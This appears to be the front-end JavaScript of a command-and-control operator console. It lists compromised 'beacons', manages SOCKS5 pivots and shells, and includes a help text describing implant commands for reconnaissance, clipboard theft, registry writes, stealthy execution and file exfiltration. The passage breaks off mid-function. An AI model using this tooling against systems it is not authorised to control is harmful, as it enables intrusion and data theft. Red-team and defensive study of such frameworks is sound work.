// ---- Stars ----

function initStars() {
    const container = document.createElement('div');
    container.id = 'stars';
    document.documentElement.appendChild(container);
    for (let i = 0; i < 150; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.left    = (Math.random() * 100).toFixed(2) + 'vw';
        star.style.top     = (Math.random() * 100).toFixed(2) + 'vh';
        star.style.opacity = (0.05 + Math.random() * 0.2).toFixed(2);
        const size = Math.random() < 0.85 ? 1 : 2;
        star.style.width  = size + 'px';
        star.style.height = size + 'px';
        container.appendChild(star);
    }
}

initStars();

// ---- Terminal Resizer ----

function initTerminalResizer() {
    const resizer = document.getElementById('terminal-resizer');
    const workspace = document.querySelector('.workspace');
    if (!resizer || !workspace) return;

    let isResizing = false;

    resizer.addEventListener('mousedown', (e) => {
        isResizing = true;
        workspace.classList.add('resizing');
        document.body.style.cursor = 'row-resize';
        e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;
        const workspaceRect = workspace.getBoundingClientRect();
        const newHeight = workspaceRect.bottom - e.clientY;
        
        // Clamp height between 100px and 80% of workspace
        const clampedHeight = Math.max(100, Math.min(newHeight, workspaceRect.height * 0.8));
        document.documentElement.style.setProperty('--terminal-height', clampedHeight + 'px');

        if (_currentView === 'map') loadSessions();
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            workspace.classList.remove('resizing');
            document.body.style.cursor = '';
            const h = getComputedStyle(document.documentElement).getPropertyValue('--terminal-height');
            localStorage.setItem('bebop_termHeight', h.trim());
        }
    });
}

function initPanelResizerH() {
    const resizer = document.getElementById('panel-resizer-h');
    const container = document.querySelector('.bottom-panels');
    const termPanel = document.querySelector('.terminal-panel');
    const logPanel = document.querySelector('.event-log-panel');
    if (!resizer || !container || !termPanel || !logPanel) return;

    let isResizing = false;

    resizer.addEventListener('mousedown', (e) => {
        isResizing = true;
        container.classList.add('resizing-h');
        document.body.style.cursor = 'col-resize';
        e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;
        const rect = container.getBoundingClientRect();
        const offset = e.clientX - rect.left;
        const minW = 200;
        const clamped = Math.max(minW, Math.min(offset, rect.width - minW));
        const ratio = clamped / rect.width;
        termPanel.style.flex = 'none';
        logPanel.style.flex = 'none';
        termPanel.style.width = (ratio * 100) + '%';
        logPanel.style.width = ((1 - ratio) * 100) + '%';
        if (_term) _fitAddon.fit();
        if (_shellTerm && _shellFit) try { _shellFit.fit(); } catch(_) {}
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            container.classList.remove('resizing-h');
            document.body.style.cursor = '';
            if (_term) _fitAddon.fit();
            if (_shellTerm && _shellFit) try { _shellFit.fit(); } catch(_) {}
        }
    });
}

// Call inits
setTimeout(() => {
    initTerminalResizer();
    initPanelResizerH();
    initMapControls();
}, 100);

// ---- Navigation ----

let _currentView = 'table';

function setView(view) {
    _currentView = view;
    const tableView = document.getElementById('sessions-table-view');
    const mapView = document.getElementById('map-view');

    const btnTable = document.getElementById('btn-view-table');
    const btnMap = document.getElementById('btn-view-map');

    if (tableView) tableView.style.display = 'none';
    if (mapView) mapView.style.display = 'none';

    [btnTable, btnMap].forEach(btn => { if (btn) btn.classList.remove('active'); });

    if (view === 'table') {
        if (tableView) tableView.style.display = 'block';
        if (btnTable) btnTable.classList.add('active');
        loadSessions();
    } else {
        if (mapView) mapView.style.display = 'flex';
        if (btnMap) btnMap.classList.add('active');
        const noMsg = document.getElementById('no-sessions');
        if (noMsg) noMsg.style.display = 'none';
        loadSessions();
    }
}

// ---- Table Rendering ----

function renderTable(beacons) {
    const tbody = document.getElementById('beacons-table-body');
    if (!tbody) return;

    tbody.innerHTML = '';
    beacons.slice().sort((a, b) => a.id - b.id).forEach(b => {
        if (b.shell_active) _activeShells.add(b.id);
        else _activeShells.delete(b.id);
        const status = beaconStatus(b);
        const os = (PLATFORM_MAP[b.platform] ?? String(b.platform)) + ' ' + (ARCH_MAP[b.arch] ?? String(b.arch));
        const integ = INTEGRITY_MAP[b.integrity] ?? String(b.integrity);

        // Beacon row
        const socksBadgeHtml = (b.socks_active && b.socks_port)
            ? ` <span class="badge-socks5">SOCKS5 ${escapeHtml(b.socks_host || '')}:${b.socks_port}</span>`
            : '';

        const tr = document.createElement('tr');
        tr.dataset.beaconId = b.id;
        tr.innerHTML = `
            <td>
                <div class="status-cell beacon-${status}">
                    <span class="card-badge badge-${status}">${status.toUpperCase()}</span>
                </div>
            </td>
            <td style="color: var(--amber)">${escapeHtml(b.hostname || '?')} <span class="badge-beacon">BEACON</span>${socksBadgeHtml}</td>
            <td>${escapeHtml(b.username || '—')}</td>
            <td>${escapeHtml(os)}</td>
            <td>${escapeHtml(integ)}</td>
            <td>${b.process_id}</td>
            <td style="color: var(--blue)">${escapeHtml(b.listener_name || '—')}</td>
            <td>${b.sleep}s</td>
            <td data-ts="${b.last_seen}">${timeAgo(b.last_seen)}</td>
        `;
        tr.addEventListener('contextmenu', (e) => { e.preventDefault(); showContextMenu(e, b); });
        tr.addEventListener('dblclick', () => openTerminal(b.id));
        tbody.appendChild(tr);

        // Session row (when session TCP is active)
        if (b.mode === 'session') {
            const sessRow = document.createElement('tr');
            sessRow.innerHTML = `
                <td>
                    <div class="status-cell beacon-active">
                        <span class="card-badge badge-active">ACTIVE</span>
                    </div>
                </td>
                <td style="color: #78dce8">${escapeHtml(b.hostname || '?')} <span class="badge-session">SESSION</span></td>
                <td>${escapeHtml(b.username || '—')}</td>
                <td>${escapeHtml(os)}</td>
                <td>${escapeHtml(integ)}</td>
                <td>${b.process_id}</td>
                <td style="color: var(--blue)">${escapeHtml(b.listener_name || '—')}</td>
                <td>realtime</td>
                <td>—</td>
            `;
            sessRow.addEventListener('dblclick', () => openTerminal('sess_' + b.id));
            sessRow.addEventListener('contextmenu', (e) => { e.preventDefault(); showContextMenu(e, b, false, true); });
            tbody.appendChild(sessRow);
        }

        // Shell row (when shell is active for this beacon)
        if (b.alive && _activeShells.has(b.id)) {
            const sr = document.createElement('tr');
            sr.innerHTML = `
                <td>
                    <div class="status-cell beacon-active">
                        <span class="card-badge badge-active">ACTIVE</span>
                    </div>
                </td>
                <td style="color: #AFA9EC">${escapeHtml(b.hostname || '?')} <span class="badge-session">SHELL</span></td>
                <td>${escapeHtml(b.username || '—')}</td>
                <td>${escapeHtml(os)}</td>
                <td>${escapeHtml(integ)}</td>
                <td>${b.process_id}</td>
                <td style="color: var(--blue)">${escapeHtml(b.listener_name || '—')}</td>
                <td>—</td>
                <td>—</td>
            `;
            sr.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                showContextMenu(e, b, true);
            });
            sr.addEventListener('dblclick', () => openShellTerminal(b.id));
            tbody.appendChild(sr);
        }
    });
}

// ---- Context Menu ----

let _activeCtxBeacon = null;

function hideContextMenu() {
    const menu = document.getElementById('context-menu');
    if (menu) menu.style.display = 'none';
}

function showContextMenu(e, beacon, isShellRow, isSessionRow) {
    e.preventDefault();
    _activeCtxBeacon = beacon;
    const menu = document.getElementById('context-menu');
    if (!menu) return;

    const ctxInteract = document.getElementById('ctx-interact');
    const ctxSession  = document.getElementById('ctx-session');
    const ctxKill     = document.getElementById('ctx-kill');
    const sep         = menu.querySelector('.context-separator');

    // Remove any previously injected SOCKS5 items
    menu.querySelectorAll('.ctx-socks-dynamic').forEach(el => el.parentNode.removeChild(el));

    if (isSessionRow) {
        ctxInteract.textContent = 'Interact';
        ctxInteract.onclick = () => { openTerminal('sess_' + beacon.id); hideContextMenu(); };
        ctxSession.style.display = 'none';
        sep.style.display = '';
        ctxKill.textContent = 'Close Session';
        ctxKill.style.display = '';
        ctxKill.onclick = () => { closeSession(beacon.id); hideContextMenu(); };

        _injectSocksContextItems(menu, sep, beacon);
    } else if (isShellRow) {
        ctxInteract.textContent = 'Interact Shell';
        ctxInteract.onclick = () => { openShellTerminal(beacon.id); hideContextMenu(); };
        ctxSession.style.display = 'none';
        sep.style.display = 'none';
        ctxKill.textContent = 'Close Shell';
        ctxKill.onclick = () => { stopShell(beacon.id); hideContextMenu(); };
    } else {
        ctxInteract.textContent = 'Interact';
        ctxInteract.onclick = () => { openTerminal(beacon.id); hideContextMenu(); };
        if (beacon.alive) {
            ctxSession.style.display = '';
            sep.style.display = '';
            ctxSession.onclick = () => { showShellModal(beacon.id, beacon.hostname || ''); hideContextMenu(); };
        } else {
            ctxSession.style.display = 'none';
            sep.style.display = '';
        }
        ctxKill.textContent = beacon.alive ? 'Kill Beacon' : 'Delete Beacon';
        ctxKill.onclick = () => { showKillModal(beacon.id, beacon.hostname, !beacon.alive); hideContextMenu(); };
    }

    menu.style.display = 'block';
    const mx = Math.min(e.clientX, window.innerWidth - menu.offsetWidth - 8);
    const my = Math.min(e.clientY, window.innerHeight - menu.offsetHeight - 8);
    menu.style.left = mx + 'px';
    menu.style.top = my + 'px';
}

function _injectSocksContextItems(menu, insertBefore, beacon) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;

    const b = _beacons[beacon.id] || beacon;
    const socksActive = !!(b.socks_active);

    const socksItem = document.createElement('div');
    socksItem.className = 'context-item ctx-socks ctx-socks-dynamic';

    if (socksActive) {
        socksItem.textContent = 'Stop SOCKS5';
        socksItem.onclick = () => {
            authFetch(tsUrl + '/api/socks/' + beacon.id, { method: 'DELETE' })
                .then(r => {
                    if (!r.ok) {
                        r.text().then(t => appendLine('[!] ' + t, 'err'));
                        return;
                    }
                    const bx = _beacons[beacon.id];
                    if (bx) {
                        bx.socks_active = false;
                        bx.socks_host   = '';
                        bx.socks_port   = 0;
                    }
                    removeSocksBadge(beacon.id);
                })
                .catch(err => appendLine('[!] socks stop error: ' + err.message, 'err'));
            hideContextMenu();
        };
    } else {
        socksItem.textContent = 'Start SOCKS5';
        socksItem.onclick = () => {
            authFetch(tsUrl + '/api/socks', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ beacon_id: beacon.id }),
            })
                .then(r => {
                    if (!r.ok) {
                        r.text().then(t => appendLine('[!] ' + t, 'err'));
                        return null;
                    }
                    return r.json();
                })
                .then(d => {
                    if (!d) return;
                    const bx = _beacons[beacon.id];
                    if (bx) {
                        bx.socks_active = true;
                        bx.socks_host   = d.host || '';
                        bx.socks_port   = d.port || 0;
                    }
                    updateSocksBadge(beacon.id, d.host || '', d.port || 0);
                })
                .catch(err => appendLine('[!] socks start error: ' + err.message, 'err'));
            hideContextMenu();
        };
    }

    menu.insertBefore(socksItem, insertBefore);
}

document.addEventListener('click', hideContextMenu);
document.addEventListener('contextmenu', (e) => {
    if (!e.target.closest('.node-victim') && !e.target.closest('#beacons-table tbody tr')) hideContextMenu();
});

// ---- Graph Rendering ----

let _manualPositions = {};
let _draggingNode = null;
let _dragOffset = { x: 0, y: 0 };
let _hasDragged = false;
let _mapZoom = 1.0;
let _mapPan = { x: 0, y: 0 };
let _isPanning = false;
let _panStart = { x: 0, y: 0 };

function initMapControls() {
    const container = document.getElementById('map-container');
    const viewport = document.getElementById('map-viewport');
    if (!container || !viewport) return;

    // Zoom
    container.addEventListener('wheel', (e) => {
        if (_currentView !== 'map') return;
        e.preventDefault();
        const zoomSpeed = 0.1;
        if (e.deltaY < 0) _mapZoom = Math.min(3.0, _mapZoom + zoomSpeed);
        else _mapZoom = Math.max(0.2, _mapZoom - zoomSpeed);
        updateMapTransform();
    }, { passive: false });

    // Pan Start
    container.addEventListener('mousedown', (e) => {
        if (_currentView !== 'map' || e.button !== 0) return;
        if (e.target.closest('.map-node')) return; // Don't pan if dragging a node

        _isPanning = true;
        _panStart.x = e.clientX - _mapPan.x * _mapZoom;
        _panStart.y = e.clientY - _mapPan.y * _mapZoom;
        container.style.cursor = 'grabbing';
        viewport.style.transition = 'none';
    });

    // Pan Move & Node Drag Move
    document.addEventListener('mousemove', (e) => {
        if (_isPanning) {
            _mapPan.x = (e.clientX - _panStart.x) / _mapZoom;
            _mapPan.y = (e.clientY - _panStart.y) / _mapZoom;
            updateMapTransform();
            return;
        }

        if (!_draggingNode) return;
        _hasDragged = true;
        const nodeContainer = document.getElementById('map-nodes');
        const rect = nodeContainer.getBoundingClientRect();
        
        // Correct mouse coordinates considering zoom AND pan
        let x = (e.clientX - rect.left) / _mapZoom + 50 - (_dragOffset.x / _mapZoom);
        let y = (e.clientY - rect.top) / _mapZoom + 50 - (_dragOffset.y / _mapZoom);

        _draggingNode.el.style.left = (x - 50) + 'px';
        _draggingNode.el.style.top = (y - 50) + 'px';
        _manualPositions[_draggingNode.id] = { x, y };

        const sPos = _manualPositions['server'];
        const svg = document.getElementById('map-svg');
        if (_draggingNode.id === 'server') {
            svg.querySelectorAll('line').forEach(l => {
                l.setAttribute('x1', x); l.setAttribute('y1', y);
            });
        } else {
            const line = document.getElementById('line-' + _draggingNode.id);
            if (line) {
                line.setAttribute('x2', x);
                line.setAttribute('y2', y);
            }
        }
    });

    document.addEventListener('mouseup', () => {
        if (_isPanning) {
            _isPanning = false;
            container.style.cursor = '';
            viewport.style.transition = 'transform 0.1s ease-out';
        }
        if (_draggingNode) {
            _draggingNode.el.style.transition = '';
            _draggingNode.el.style.zIndex = '';
            _draggingNode = null;
        }
    });
}

function updateMapTransform() {
    const viewport = document.getElementById('map-viewport');
    if (viewport) {
        viewport.style.transform = `scale(${_mapZoom}) translate(${_mapPan.x}px, ${_mapPan.y}px)`;
    }
}

// Call controls init
setTimeout(initMapControls, 100);

function renderMap(beacons) {
    const container = document.getElementById('map-nodes');
    const svg = document.getElementById('map-svg');
    const viewport = document.getElementById('map-viewport');
    if (!container || !svg || !viewport) return;

    // Apply current transform
    updateMapTransform();

    // Don't wipe if we are interacting
    if (_draggingNode || _isPanning) return;

    container.innerHTML = '';
    svg.innerHTML = '';

    const width = svg.clientWidth;
    const height = svg.clientHeight;
    const centerX = width / 2;
    const centerY = height / 2;
    const offset = 50;

    // 1. Teamserver (Center)
    if (!_manualPositions['server']) {
        _manualPositions['server'] = { x: centerX, y: centerY };
    }
    const sPos = _manualPositions['server'];
    
    const serverNode = document.createElement('div');
    serverNode.className = 'map-node node-server';
    serverNode.style.left = (sPos.x - offset) + 'px';
    serverNode.style.top = (sPos.y - offset) + 'px';
    serverNode.innerHTML = '<div class="node-icon"></div><div class="node-label">Teamserver</div>';
    initDraggable(serverNode, 'server');
    container.appendChild(serverNode);

    if (!beacons || beacons.length === 0) return;

    // 2. Beacons
    const radius = Math.min(centerX, centerY) * 0.65;
    beacons.forEach((b, i) => {
        const id = 'beacon-' + b.id;
        if (!_manualPositions[id]) {
            const angle = (i / beacons.length) * (2 * Math.PI);
            _manualPositions[id] = {
                x: centerX + radius * Math.cos(angle),
                y: centerY + radius * Math.sin(angle)
            };
        }
        
        const pos = _manualPositions[id];
        const node = document.createElement('div');
        node.className = 'map-node node-victim' + (!b.alive ? ' dead' : '');
        node.style.left = (pos.x - offset) + 'px';
        node.style.top = (pos.y - offset) + 'px';
        node.innerHTML = `<div class="node-icon"></div><div class="node-label">${escapeHtml(b.hostname || 'Unknown')}</div>`;
        
        // Single click to interact (if not dragged)
        node.onclick = () => {
            if (!_hasDragged) openTerminal(b.id);
        };

        // Right click for context menu
        node.oncontextmenu = (e) => showContextMenu(e, b);
        
        initDraggable(node, id);
        container.appendChild(node);

        // Draw connection line
        const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
        line.id = 'line-' + id;
        line.setAttribute('x1', sPos.x);
        line.setAttribute('y1', sPos.y);
        line.setAttribute('x2', pos.x);
        line.setAttribute('y2', pos.y);
        line.setAttribute('class', 'connection-line');
        svg.appendChild(line);
    });
}

function initDraggable(el, id) {
    el.onmousedown = (e) => {
        if (e.button !== 0) return; // Left click only
        _draggingNode = { el, id };
        _hasDragged = false;
        const rect = el.getBoundingClientRect();
        _dragOffset.x = e.clientX - rect.left;
        _dragOffset.y = e.clientY - rect.top;
        el.style.transition = 'none';
        el.style.zIndex = 1000;
        e.preventDefault();
    };
}

// ---- Teamserver config ----

function getTsUrl() {
    const ip   = localStorage.getItem('tsIp')   || '';
    const port = localStorage.getItem('tsPort')  || '8080';
    if (!ip) return '';
    return 'http://' + ip + ':' + port;
}

function saveSettings() {
    const ipEl = document.getElementById('tsIp');
    const portEl = document.getElementById('tsPort');
    if (!ipEl || !portEl) return;

    const ip   = ipEl.value.trim();
    const port = portEl.value.trim() || '8080';
    
    localStorage.setItem('tsIp',   ip);
    localStorage.setItem('tsPort', port);

    updateConnIndicator(!!ip);
    
    // Refresh current view
    if (document.getElementById('sessions-table-view')) loadSessions();
    if (document.getElementById('listeners-tbody')) loadListeners();
    if (document.getElementById('build-btn')) populateBuildListeners();
}

function initSettings() {
    ensureSettingsModal();
    const ipEl   = document.getElementById('tsIp');
    const portEl = document.getElementById('tsPort');
    if (ipEl)   ipEl.value   = localStorage.getItem('tsIp')   || '';
    if (portEl) portEl.value = localStorage.getItem('tsPort')  || '';
    updateConnIndicator(!!(localStorage.getItem('tsIp') || ''));
}

function ensureSettingsModal() {
    if (document.getElementById('settings-modal')) return;
    const wrap = document.createElement('div');
    wrap.innerHTML = [
        '<div id="settings-modal" class="modal-backdrop" hidden>',
        '  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="settings-title">',
        '    <span class="modal-tab">// connection</span>',
        '    <button type="button" class="modal-close" aria-label="Close">×</button>',
        '    <h3 id="settings-title" class="modal-title">Teamserver</h3>',
        '    <p class="modal-subtitle">route operator traffic to the C2 frame</p>',
        '    <div class="modal-row">',
        '      <div class="modal-field">',
        '        <label for="tsIp">host</label>',
        '        <input id="tsIp" type="text" placeholder="192.168.1.100" autocomplete="off" spellcheck="false">',
        '      </div>',
        '      <div class="modal-field modal-field-narrow">',
        '        <label for="tsPort">port</label>',
        '        <input id="tsPort" type="text" placeholder="8080" autocomplete="off" spellcheck="false">',
        '      </div>',
        '    </div>',
        '    <div class="modal-footer">',
        '      <a href="#" class="modal-logout" data-action="logout" title="Log out of this session">',
        '        <svg class="modal-logout-svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>',
        '        <span>jack out</span>',
        '      </a>',
        '      <div class="modal-actions">',
        '        <button type="button" class="btn-ghost" data-action="cancel">cancel</button>',
        '        <button type="button" data-action="save">connect</button>',
        '      </div>',
        '    </div>',
        '  </div>',
        '</div>'
    ].join('');
    const modal = wrap.firstElementChild;
    document.body.appendChild(modal);

    modal.addEventListener('click', (e) => {
        if (e.target === modal) closeSettings();
    });
    modal.querySelector('.modal-close').addEventListener('click', closeSettings);
    modal.querySelector('[data-action="cancel"]').addEventListener('click', closeSettings);
    modal.querySelector('[data-action="save"]').addEventListener('click', () => {
        saveSettings();
        closeSettings();
    });
    modal.querySelector('[data-action="logout"]').addEventListener('click', (e) => {
        e.preventDefault();
        logout();
    });

    document.addEventListener('keydown', (e) => {
        if (modal.hidden) return;
        if (e.key === 'Escape') { e.preventDefault(); closeSettings(); }
        else if (e.key === 'Enter') { e.preventDefault(); saveSettings(); closeSettings(); }
    });
}

function openSettings() {
    ensureSettingsModal();
    const modal = document.getElementById('settings-modal');
    const ip    = document.getElementById('tsIp');
    const port  = document.getElementById('tsPort');
    if (ip)   ip.value   = localStorage.getItem('tsIp')   || '';
    if (port) port.value = localStorage.getItem('tsPort')  || '8080';
    modal.hidden = false;
    requestAnimationFrame(() => modal.classList.add('open'));
    setTimeout(() => {
        if (ip && !ip.value) ip.focus();
        else if (ip) ip.select();
    }, 40);
}

function closeSettings() {
    const modal = document.getElementById('settings-modal');
    if (!modal || modal.hidden) return;
    modal.classList.remove('open');
    setTimeout(() => { modal.hidden = true; }, 180);
}

function updateConnIndicator(connected) {
    const dot    = document.getElementById('conn-dot');
    const status = document.getElementById('conn-status');
    if (dot)    dot.className    = 'conn-dot' + (connected ? ' connected' : '');
    if (status) status.textContent = connected ? 'CONNECTED' : 'OFFLINE';
}

// ---- Auth ----

async function authFetch(url, options = {}) {
    const token = localStorage.getItem('authToken');
    if (token) {
        if (!options.headers) options.headers = {};
        if (options.headers instanceof Headers) {
            options.headers.set('Authorization', 'Bearer ' + token);
        } else {
            options.headers['Authorization'] = 'Bearer ' + token;
        }
    }
    const resp = await fetch(url, options);
    if (resp.status === 401) {
        localStorage.removeItem('authToken');
        window.location.href = '/login';
        throw new Error('unauthorized');
    }
    return resp;
}

function checkAuth() {
    const token = localStorage.getItem('authToken');
    if (!token) {
        window.location.href = '/login';
        return false;
    }
    return true;
}

async function logout() {
    const token = localStorage.getItem('authToken');
    if (token) {
        try {
            await fetch('/api/auth/logout', {
                method: 'POST',
                headers: { 'Authorization': 'Bearer ' + token }
            });
        } catch (_) {}
    }
    localStorage.removeItem('authToken');
    window.location.href = '/login';
}

// ---- Client-side help ----

const HELP_TEXT = [
    '',
    '[ 01. IDENTITY & RECON ]',
    '  whoami              Query current session user context',
    '  hostname            Display target machine network name',
    '  domain              Retrieve DNS domain / AD membership status',
    '  getpid              Show process ID of the running implant',
    '  getintegrity        Check token integrity (Low/Med/High/System)',
    '',
    '[ 02. SYSTEM ENUMERATION ]',
    '  sysinfo             Retrieve OS build, arch, and memory metrics',
    '  drives              List logical drives and available storage',
    '  env                 Dump all process environment variables',
    '  getenv <var>        Get value of a specific environment variable',
    '',
    '[ 03. FILESYSTEM MANIPULATION ]',
    '  pwd                 Print current working directory',
    '  cd <path>           Change working directory',
    '  ls [path]           List directory contents (Alias: dir)',
    '  cat <file>          Read and display raw file content',
    '  stat <path>         Get file/directory metadata and timestamps',
    '  mkdir <path>        Create a new directory',
    '  rm <file>           Permanently delete a file',
    '  rmdir <path>        Remove an empty directory',
    '  cp <src> <dst>      Copy file to a new destination',
    '  mv <src> <dst>      Move or rename file/directory',
    '',
    '[ 04. PROCESS & NETWORK ]',
    '  ps                  List active processes (PID, PPID, Name)',
    '  kill <pid>          Terminate a process by its ID',
    '  ipconfig            List network adapters and IP addresses',
    '  arp                 Display current ARP cache entries',
    '  netstat             List active TCP/UDP connections and listening ports',
    '  dns <name>          Resolve hostname to IP via DnsQuery (no nslookup)',
    '',
    '[ 05. PRIVILEGES & GROUPS ]',
    '  privs               List token privileges (SeDebug, SeImpersonate, etc.)',
    '  groups              List local groups the current user belongs to',
    '',
    '[ 06. PERSISTENCE & CONFIGURATION ]',
    '  services            Enumerate all Win32 services (name, state, PID)',
    '  uptime              Time since last system boot (GetTickCount64)',
    '  reg_query <H\\key> <val>   Read a registry value (HKLM/HKCU/HKCR/HKU)',
    '  reg_set   <H\\key> <val> <data>  Write a REG_SZ registry value',
    '',
    '[ 07. DATA COLLECTION ]',
    '  clipboard           Read current clipboard text content',
    '',
    '[ 08. BEACON CONTROL ]',
    '  sleep <sec> [jit]   Adjust check-in interval and jitter %',
    '  interactive         Upgrade to persistent TCP session (real-time)',
    '  shell               Open interactive shell (requires session mode)',
    '  socks5 start [port] Start SOCKS5 proxy tunnel (requires session mode)',
    '  socks5 stop         Stop active SOCKS5 proxy tunnel',
    '  exit                Terminate the beacon process',
    '',
    '[ 09. EXECUTION MODES ]',
    '  runas <user> <pass> <cmd>  Run command as another user (no runas.exe)',
    '  shell <cmd>         Execute via cmd.exe /c (Supports pipes/built-ins)',
    '  <program> [args]    Direct execution (No cmd.exe - Stealthier)',
    '',
    '[ 10. TERMINAL ]',
    '  help                Show this command reference',
    '  clear               Clear the terminal screen',
    '',
    '[ 11. FILE TRANSFER ]',
    '  download <remote>    Exfil file from target to teamserver (beacon→op)',
    '  upload <remote>     Upload file from operator to target path (op→beacon)',
    '                      Opens a file picker, then stages the selected file to <remote>',
    '',
    '───────────────────────────────────────────────────────────────',
    'All commands are executed natively via Win32 API unless "shell" is used.',
];

// ---- Utilities ----

const VALID_COMMANDS = [
    'whoami', 'hostname', 'domain', 'getpid', 'getintegrity',
    'sysinfo', 'drives', 'env', 'getenv', 'pwd', 'cd', 'ls', 'dir',
    'cat', 'stat', 'mkdir', 'rm', 'rmdir', 'cp', 'mv', 'ps', 'kill',
    'ipconfig', 'arp', 'netstat', 'dns',
    'privs', 'groups', 'services', 'uptime',
    'reg_query', 'reg_set', 'clipboard', 'runas',
    'shell', 'sleep', 'interactive', 'exit', 'help', 'clear',
    'download', 'upload', 'socks5',
];

const ARCH_MAP      = ['x86', 'x64', 'arm', 'arm64'];
const PLATFORM_MAP  = ['Linux', 'macOS', 'Windows'];
const INTEGRITY_MAP = ['Untrusted', 'Low', 'Medium', 'High', 'System'];

function timeAgo(unixTs) {
    const diff = Math.floor(Date.now() / 1000) - unixTs;
    if (diff < 60)   return diff + 's ago';
    if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
    return Math.floor(diff / 3600) + 'h ago';
}

setInterval(() => {
    document.querySelectorAll('[data-ts]').forEach(el => {
        el.textContent = timeAgo(+el.dataset.ts);
    });
}, 1000);

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ---- Kill beacon ----

let _killTargetId = null;

let _killIsDead = false;

function showKillModal(id, hostname, isDead) {
    _killTargetId = id;
    _killIsDead = !!isDead;
    const el = document.getElementById('kill-modal-target');
    if (el) el.textContent = hostname || ('beacon #' + id);
    const label = document.getElementById('kill-modal-label');
    if (label) label.textContent = isDead ? 'Delete' : 'Kill';
    const btn = document.getElementById('kill-modal-confirm');
    if (btn) {
        btn.textContent = isDead ? 'DELETE' : 'KILL';
        btn.className = isDead ? 'btn-delete' : 'btn-kill';
    }
    const modal = document.getElementById('kill-modal');
    if (modal) modal.style.display = 'flex';
}

function cancelKill() {
    _killTargetId = null;
    const modal = document.getElementById('kill-modal');
    if (modal) modal.style.display = 'none';
}

async function confirmKill() {
    const id = _killTargetId;
    const target = document.getElementById('kill-modal-target');
    const hostname = target ? target.textContent : '#' + id;
    cancelKill();
    if (id == null) return;
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        await authFetch(tsUrl + '/api/sessions/' + id, { method: 'DELETE' });
    } catch (e) {
        console.error('kill beacon:', e);
    }
    loadSessions();
}

// ---- Toast ----

function showToast(hostname, username) {
    const container = document.getElementById('toast-container');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML =
        '<div class="toast-dot"></div>' +
        '<div>' +
            '<div class="toast-title">NEW SESSION</div>' +
            '<div class="toast-body">' + escapeHtml(hostname) + ' // ' + escapeHtml(username) + '</div>' +
            '<div class="toast-quote">"A new soul has drifted in."</div>' +
        '</div>';
    container.appendChild(toast);
    requestAnimationFrame(() => {
        requestAnimationFrame(() => toast.classList.add('toast-visible'));
    });
    setTimeout(() => {
        toast.classList.remove('toast-visible');
        toast.classList.add('toast-hiding');
        setTimeout(() => { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 400);
    }, 4000);
}

// ---- Sessions page ----

let _knownBeaconIds    = null;
let _knownBeaconAlive  = {};
let _beacons           = {};
let sessionWs          = null;
const _beaconModes     = {};

function _actualBid() {
    if (typeof beaconId === 'string') {
        if (beaconId.startsWith('sess_')) return parseInt(beaconId.slice(5), 10);
        if (beaconId.startsWith('shell_')) return parseInt(beaconId.slice(6), 10);
    }
    return beaconId;
}

function _isSessionTab() {
    return typeof beaconId === 'string' && beaconId.startsWith('sess_');
}

// Shell tab state (separate xterm instance)
let _shellTerm        = null;
let _shellFit         = null;
let _shellWsMap       = new Map();
let _activeShellBid   = null;

function beaconStatus(b) {
    if (!b.alive) return 'dead';
    return 'active';
}

function connectSessionWs(bid) {
    if (sessionWs) { sessionWs.close(); sessionWs = null; }
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    const wsProto = tsUrl.startsWith('https') ? 'wss' : 'ws';
    const wsHost = tsUrl.replace(/^https?:\/\//, '');
    const token = localStorage.getItem('authToken') || '';
    const url = wsProto + '://' + wsHost + '/ws/session/' + bid + '?token=' + encodeURIComponent(token);
    sessionWs = new WebSocket(url);

    sessionWs.onmessage = function(event) {
        try {
            const data = JSON.parse(event.data);
            if (data.label && !_tabLabels[data.label]) return;
            if (data.label && _tabLabels[data.label] !== beaconId) return;
            if (data.output) {
                appendLine(data.output, 'out');
            }
        } catch (e) { /* ignore parse errors */ }
    };

    sessionWs.onclose = function() {
        sessionWs = null;
    };

    sessionWs.onerror = function() {
        if (sessionWs) { sessionWs.close(); sessionWs = null; }
    };
}

// ---- Session mode modal ----

let _sessionTargetId = null;

function showShellModal(bid, hostname) {
    _sessionTargetId = bid;
    const el = document.getElementById('session-modal-target');
    if (el) el.textContent = hostname || ('beacon #' + bid);
    const modal = document.getElementById('session-modal');
    if (modal) modal.style.display = 'flex';
}

function showSessionModal(bid, hostname) { showShellModal(bid, hostname); }

function cancelSession() {
    _sessionTargetId = null;
    const modal = document.getElementById('session-modal');
    if (modal) modal.style.display = 'none';
}

function confirmSession() {
    const bid = _sessionTargetId;
    cancelSession();
    if (bid == null) return;
    requestInteractive(bid);
}

async function closeSession(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await authFetch(tsUrl + '/api/session/' + bid, { method: 'DELETE' });
        if (!resp.ok) {
            const txt = await resp.text();
            appendLine('[!] ' + txt, 'err');
        }
    } catch (e) { /* ignore */ }
}

async function requestInteractive(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return false;
    try {
        const resp = await authFetch(tsUrl + '/api/interactive', {
            method: 'POST',
